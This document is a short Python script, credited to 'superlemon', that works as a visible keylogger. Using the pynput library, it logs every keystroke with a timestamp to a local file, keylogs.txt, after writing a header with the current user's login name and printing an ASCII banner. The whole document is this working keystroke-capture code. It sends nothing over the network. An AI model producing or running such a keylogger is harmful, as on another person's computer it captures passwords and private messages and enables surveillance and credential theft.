from pynput.keyboard import Listener
import logging
import os
import time
from termcolor import colored

file = "keylogs.txt"
time = time.asctime()
username = os.getlogin()

input(colored('Press ' + '\033[1mENTER\033[0m' +
              ' to start the keylogger or ' + '\033[1mCTRL + C\033[0m ' + 'to stop..'))


def logstarted():
    fileos = open('keylogs.txt', 'a')
    fileos.write(
        '--keylogger started on {} by the user \'{}\'--'.format(time, username) + '\n')
    fileos.close()


logstarted()
# ascii title font: ANSI Shadow
print('''

██╗  ██╗██╗     
██║ ██╔╝██║     
█████╔╝ ██║     
██╔═██╗ ██║     
██║  ██╗███████╗
╚═╝  ╚═╝╚══════╝ by superlemon 

''')
print(colored('--keylogger started, CTRL + C to stop--',
              'green', attrs=['bold']))

print('see logs on ./keylogs.txt')
logging.basicConfig(filename=file, level=logging.DEBUG,
                    format="%(asctime)s %(message)s")


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()
